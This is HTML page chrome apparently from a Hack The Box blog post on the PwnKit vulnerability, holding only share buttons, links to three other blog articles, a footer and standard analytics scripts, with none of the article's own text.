style="text-decoration: none" class="linkedin popup" href="https://www.linkedin.com/sharing/share-offsite/?url="> <svg class="social-icon-btn" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="#A4B1CD" d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z" /></svg> </a> <a style="text-decoration: none" class="twitter popup" href="https://twitter.com/intent/tweet?url="> <svg class="social-icon-btn" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#A4B1CD" d="M512 97.248c-19.04 8.352-39.328 13.888-60.48 16.576 21.76-12.992 38.368-33.408 46.176-58.016-20.288 12.096-42.688 20.64-66.56 25.408C411.872 60.704 384.416 48 354.464 48c-58.112 0-104.896 47.168-104.896 104.992 0 8.32.704 16.32 2.432 23.936-87.264-4.256-164.48-46.08-216.352-109.792-9.056 15.712-14.368 33.696-14.368 53.056 0 36.352 18.72 68.576 46.624 87.232-16.864-.32-33.408-5.216-47.424-12.928v1.152c0 51.008 36.384 93.376 84.096 103.136-8.544 2.336-17.856 3.456-27.52 3.456-6.72 0-13.504-.384-19.872-1.792 13.6 41.568 52.192 72.128 98.08 73.12-35.712 27.936-81.056 44.768-130.144 44.768-8.608 0-16.864-.384-25.12-1.44C46.496 446.88 101.6 464 161.024 464c193.152 0 298.752-160 298.752-298.688 0-4.64-.16-9.12-.384-13.568 20.832-14.784 38.336-33.248 52.608-54.496z" /></svg> </a> <span class="copylink" data-clipboard-text="https://www.hackthebox.com/blog/The-tale-of-CVE-2021-4034-AKA-PwnKit-The-13-Year-Old-Bug" style="cursor: pointer"> <svg class="social-icon-btn" style="margin-left: 1px; width: 17px;" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="#A4B1CD" d="M476.853 35.148c-46.864-46.864-122.842-46.864-169.706-.001L206.853 135.441c-48.475 48.477-43.987 125.717 0 169.706 7.366 7.366 15.516 13.372 24.122 18.305l18.305-18.305c12.006-12.008 7.78-26.045 7.564-36.174-2.635-1.868-5.198-3.887-7.564-6.253-22.573-22.571-23.588-61.265 0-84.853L349.572 77.575c23.399-23.399 61.454-23.399 84.853 0 23.399 23.399 23.399 61.454 0 84.853l-66.293 66.293c1.917 10.607 13.422 35.733 7.504 77.181.289-.284.635-.467.923-.754l100.294-100.294c46.862-46.864 46.862-122.842 0-169.706z" /><path fill="#A4B1CD" d="M312.918 199.081c-7.365-7.366-15.516-13.372-24.12-18.305l-18.305 18.305c-12.008 12.006-7.782 26.043-7.566 36.172 2.637 1.868 5.2 3.887 7.566 6.253 22.573 22.573 23.588 61.265 0 84.853L162.427 434.425c-23.399 23.399-61.454 23.399-84.853 0-23.399-23.399-23.399-61.454 0-84.853l74.067-74.067c-1.917-10.607-13.423-35.733-7.504-77.181-.289.284-.637.469-.925.756L35.147 307.147c-46.862 46.864-46.862 122.842 0 169.706 46.864 46.862 122.841 46.862 169.705 0l108.066-108.066c47.576-47.576 44.976-124.731 0-169.706z" /></svg> </span> </div> </div> </div> </div> </section> <section class="pt-2"> <div class="container" style="max-width: 1200px; margin:auto; margin-top: 100px;"> <div style="border-top: 1px solid #A4B1CD; opacity: 0.3"></div> </div> <div class="container" style="margin-top: 80px;"> <div style="max-width: 1200px; margin:auto;"> <div class="row"> <div class="col-12 pb-4"> <h2 class="color-white font-size32 font-weight600 line-height-48">Latest News</h2> </div> </div> <div class="row"> <div class="col-12 col-md-4 pb-6 article-card"> <a href="https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups" onclick="analytics.track('Clicked Blog Article', {position: 'body', platform: 'Marketing', platform_version: 'V3'})" class="article border-radius-10 text-decoration-none"> <div class="bg-image-responsive border-radius-t-10 article-image embed-responsive embed-responsive-16by9" style=""> <img src="../storage/blog/XZhddjfORcxnHggS7qgZMZQb3iX2Ytrx.jpg" alt="Hack the Box Blog" class="embed-responsive-item"> </div> <div class="d-flex flex-column bg-color-blue-nav-active border-radius-b-10 pt-2 pb-4 px-4 position-relative" style="min-height: 240px;"> <div class="d-flex align-items-center my-2"> <p class="color-main font-size11 letter-spacing-1-2 text-uppercase mb-0">Tips &amp; Tricks</p> <div class="reading-time color-main font-size11 text-uppercase letter-spacing-2 d-flex align-items-center pl-2"> <span class="reading-time__minutes pr-1">7</span> min read </div> </div> <h3 class="color-white font-size20 line-height-32 flex-grow-1">It is Okay to Use Writeups</h3> <div class="d-flex justify-content-between2"> <div class="d-inline-flex align-items-center pt-4 authors-avatars-container" style="width:3rem"> <img src="../storage/avatars/ebf175f982582aae191f6f34d7bce8ec.png" alt="" class="author-avatar border-radius-50pc "> <img src="../storage/avatars/89c7e91c9f4b43a7ccedd10bbcc33fdc.png" alt="" class="author-avatar border-radius-50pc push-left position-relative"> </div> <div class="d-inline-flex align-items-center pt-4 authors-names-container pl-md-2"> <p class="color-white font-size15 line-height-18 m-0"> <span>ippsec & </span> <span>0xdf,<span class="color-main"> Feb 09, 2022</span> </span> </p> </div> </div> <div> </div> </div> </a> </div> <div class="col-12 col-md-4 pb-6 article-card"> <a href="https://www.hackthebox.com/blog/Thought-Process-Behind_Creating-The-Box-Delivery" onclick="analytics.track('Clicked Blog Article', {position: 'body', platform: 'Marketing', platform_version: 'V3'})" class="article border-radius-10 text-decoration-none"> <div class="bg-image-responsive border-radius-t-10 article-image embed-responsive embed-responsive-16by9" style=""> <img src="../storage/blog/vfPkPmjbIM1aRa6Ieu3GK5eMA49R09Ie.jpg" alt="Hack the Box Blog" class="embed-responsive-item"> </div> <div class="d-flex flex-column bg-color-blue-nav-active border-radius-b-10 pt-2 pb-4 px-4 position-relative" style="min-height: 240px;"> <div class="d-flex align-items-center my-2"> <p class="color-main font-size11 letter-spacing-1-2 text-uppercase mb-0">Hacker</p> <div class="reading-time color-main font-size11 text-uppercase letter-spacing-2 d-flex align-items-center pl-2"> <span class="reading-time__minutes pr-1">6</span> min read </div> </div> <h3 class="color-white font-size20 line-height-32 flex-grow-1">Thought Process Behind Creating the Box Delivery</h3> <div class="d-flex justify-content-between2"> <p class="color-white font-size15 line-height-18 m-0"> <img src="../storage/avatars/ebf175f982582aae191f6f34d7bce8ec.png" alt="" class="author-avatar border-radius-50pc mr-2"> <span>ippsec,<span class="color-main"> Jan 31, 2022</span> </span> </p> </div> <div> </div> </div> </a> </div> <div class="col-12 col-md-4 pb-6 article-card"> <a href="https://www.hackthebox.com/blog/from-marine-jarhead-to-hacker-the-chuck-woolson-story" onclick="analytics.track('Clicked Blog Article', {position: 'body', platform: 'Marketing', platform_version: 'V3'})" class="article border-radius-10 text-decoration-none"> <div class="bg-image-responsive border-radius-t-10 article-image embed-responsive embed-responsive-16by9" style=""> <img src="../storage/blog/D3EN5zpALfkX7YTkruQJt3KldnIsrwuF.jpg" alt="Hack the Box Blog" class="embed-responsive-item"> </div> <div class="d-flex flex-column bg-color-blue-nav-active border-radius-b-10 pt-2 pb-4 px-4 position-relative" style="min-height: 240px;"> <div class="d-flex align-items-center my-2"> <p class="color-main font-size11 letter-spacing-1-2 text-uppercase mb-0">Hacker</p> <div class="reading-time color-main font-size11 text-uppercase letter-spacing-2 d-flex align-items-center pl-2"> <span class="reading-time__minutes pr-1">10</span> min read </div> </div> <h3 class="color-white font-size20 line-height-32 flex-grow-1">From Marine Jarhead to Hacker, the Chuck Woolson Story</h3> <div class="d-flex justify-content-between2"> <p class="color-white font-size15 line-height-18 m-0"> <img src="../storage/avatars/ebf175f982582aae191f6f34d7bce8ec.png" alt="" class="author-avatar border-radius-50pc mr-2"> <span>ippsec,<span class="color-main"> Jan 21, 2022</span> </span> </p> </div> <div> </div> </div> </a> </div> </div> </div> </div> </section> <section> <div class="container-fluid bg-color-blue-nav-active" style="padding: 50px; margin-top: 50px;"> <div class="row no-gutters justify-content-center"> <div col="auto"> <div class="row no-gutters"> <div class="col"> <img src="../images/landingv3/logo-htb-blog.svg" alt="Hack The Blog" style="width: 200px; margin-bottom: 15px;"> </div> </div> <h2 class="color-white font-weight600" style="font-size: 22px; margin-bottom: 15px;">The latest news and updates, direct from Hack The Box</h2> <a href="https://www.hackthebox.com/blog" target="_blank" style="text-decoration: none;"> <div class="menu-link-header-2"> <span class="letter-spacing-02">Read More</span> </div> </a> </div> </div> </div> </section> </section> </div> <section class="footer"> <div class="container"> <div class="row"> <div class="col-12 col-sm-6 col-md-3 mb-5"> <a class="d-inline-block" href="https://www.hackthebox.com/"> <img title="This symbolizes your being locked inside" title="Hack The Box: Cybersecurity Training" alt="Hack The Box: Cybersecurity Training" data-src="/images/logo-htb-white.svg" class="mb-4 mb-sm-5 lazy img-fluid w-180" src="../images/logo-htb-white.svg"> </a> <a onclick="analytics.track('Clicked Hacker', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com" class="link main-link " style="font-size: 13px; letter-spacing: 1.2px; font-weight: 600;">Hacker</a> <a onclick="analytics.track('Clicked Business', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/business-cyber-security-training" class="link main-link " style="font-size: 13px; letter-spacing: 1.2px; font-weight: 600;">Business</a> <a onclick="analytics.track('Clicked University', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/universities" class="link main-link " style="font-size: 13px; letter-spacing: 1.2px; font-weight: 600;">University</a> <div class="social-icons mt-5 mb-4"> <a onclick="analytics.track('Clicked LinkedIn', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" class="no-hover-decoration color-main mr-1" href="https://www.linkedin.com/company/hackthebox/" target="_blank" aria-label="social media"> <i title="LinkedIn" class="htb-icon-linkedin font-size24 social-icon"></i> </a> <a onclick="analytics.track('Clicked Twitter', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" class="no-hover-decoration color-main mr-1" href="https://twitter.com/hackthebox_eu" target="_blank" aria-label="social media"> <i title="Twitter" class="htb-icon-twitter font-size24 social-icon"></i> </a> <a onclick="analytics.track('Clicked Instagram', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" class="no-hover-decoration color-main mr-1" href="https://www.instagram.com/hackthebox/" target="_blank" aria-label="social media"> <i title="Instagram" class="htb-icon-instagram font-size24 social-icon"></i> </a> <a onclick="analytics.track('Clicked Facebook', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" class="no-hover-decoration color-main mr-1" href="https://www.facebook.com/hackthebox.eu" target="_blank" aria-label="social media"> <i title="Facebook" class="htb-icon-facebook font-size24 social-icon"></i> </a> <a onclick="analytics.track('Clicked Youtube', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" class="no-hover-decoration color-main mr-1" href="https://www.youtube.com/c/HackTheBox/featured" target="_blank" aria-label="social media"> <i title="Youtube" class="htb-icon-youtube font-size24 social-icon"></i> </a> <a onclick="analytics.track('Clicked Discord', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" class="no-hover-decoration color-main" href="https://discord.com/invite/hackthebox" target="_blank" aria-label="social media"> <i title="Discord" class="htb-icon-discord font-size24 social-icon"></i> </a> </div> </div> <div class="col-12 col-sm-6 col-md-3"> <div class="title color-white">Products</div> <a onclick="analytics.track('Clicked Hacking Labs', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/hacker/hacking-labs" class="link ">Hacking Labs</a> <a onclick="analytics.track('Clicked Pro Labs', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/hacker/pro-labs" class="link ">Pro Labs</a> <a onclick="analytics.track('Clicked Battlegrounds', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/hacker/hacking-battlegrounds" class="link ">Battlegrounds</a> <a onclick="analytics.track('Clicked Capture The Flag', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://ctf.hackthebox.eu" class="link ">Capture The Flag</a> <a onclick="analytics.track('Clicked Academy', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://academy.hackthebox.eu" class="link ">Academy</a> <a onclick="analytics.track('Clicked InfoSec Careers', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/hacker/infosec-careers" class="link ">InfoSec Careers</a> </div> <div class="col-12 col-sm-6 col-md-3"> <div class="title mt-4 mt-sm-0 color-white">Company</div> <a onclick="analytics.track('Clicked About Us', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/about-us" class="link  ">About Us</a> <a onclick="analytics.track('Clicked Join Us', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/join-us" class="link  ">Join Us</a> <a onclick="analytics.track('Clicked Contact Us', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/contact-us" class="link  ">Contact Us</a> <a onclick="analytics.track('Clicked Swag', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://hackthebox.store" class="link  ">Swag</a> <a onclick="analytics.track('Clicked Gift Cards', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/giftcards" class="link  ">Gift Cards</a> <a onclick="analytics.track('Clicked News', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/newsroom" class="link  ">News</a> <a onclick="analytics.track('Clicked Newsletter', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://resources.hackthebox.eu/hack-the-box-newsletter-sign-up" class="link  ">Newsletter</a> <a onclick="analytics.track('Clicked Partners', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/partners" class="link  ">Partners</a> </div> <div class="col-12 col-sm-6 col-md-3"> <div class="title mt-4 mt-sm-0 color-white">Resources</div> <a onclick="analytics.track('Clicked Knowledge Base', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://help.hackthebox.eu" class="link  ">Knowledge Base</a> <a onclick="analytics.track('Clicked Blog', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/blog" class="link  ">Blog</a> <a onclick="analytics.track('Clicked Forum', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://forum.hackthebox.eu" class="link  ">Forum</a> <a onclick="analytics.track('Clicked Testimonials', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://www.hackthebox.com/testimonials" class="link  ">Testimonials</a> <a onclick="analytics.track('Clicked Certificate Validation', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/certificates" class="link  ">Certificate Validation</a> <a onclick="analytics.track('Clicked Players', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://www.hackthebox.com/members#1" class="link  ">Players</a> <a onclick="analytics.track('Clicked Teams', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" target=&quot;_blank&quot; href="https://www.hackthebox.com/teams" class="link  ">Teams</a> </div> </div> <div class="row justify-content-center mt-4 mt-sm-5 pt-3 text-center copyrights-wrapper"> <div class="col-auto copyright mx-4">Â© 2021 Hack The Box</div> <div class="col-auto mx-4"><a onclick="analytics.track('Clicked Acceptable Use Policy', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/aup" class="link">Acceptable Use Policy</a></div> <div class="col-auto mx-4"><a onclick="analytics.track('Clicked Terms of Service', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/tos" class="link">Terms of Service</a></div> <div class="col-auto mx-4"><a onclick="analytics.track('Clicked Privacy Policy', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="https://www.hackthebox.com/privacypolicy" class="link">Privacy Policy</a></div> <div class="col-auto mx-4"><a onclick="Cookiebot.renew();analytics.track('Clicked Cookie Settings', {position: 'footer', platform: 'Marketing', platform_version: 'V3'})" href="javascript:void(0);" class="link">Cookie Settings</a></div> </div> </div> </section> <script data-cookieconsent="ignore" src="../assets/js/blog_article.min.js"></script> <script> (function(ss,ex){ window.ldfdr=window.ldfdr||function(){(ldfdr._q=ldfdr._q||[]).push([].slice.call(arguments));}; (function(d,s){ fs=d.getElementsByTagName(s)[0]; function ce(src){ var cs=d.createElement(s); cs.src=src; cs.async=1; fs.parentNode.insertBefore(cs,fs); }; ce('https://sc.lfeeder.com/lftracker_v1_'+ss+(ex?'_'+ex:'')+'.js'); })(document,'script'); })('3P1w24dxvvJ4mY5n'); </script> <script> (function(h,o,t,j,a,r){ h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)}; h._hjSettings={hjid:2732698,hjsv:6}; a=o.getElementsByTagName('head')[0]; r=o.createElement('script');r.async=1; r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv; a.appendChild(r); })(window,document,'https://static.hotjar.com/c/hotjar-','.js?sv='); </script> <script type="text/javascript" id="hs-script-loader" async defer src="https://js.hs-scripts.com/5514032.js"></script> </body> </html>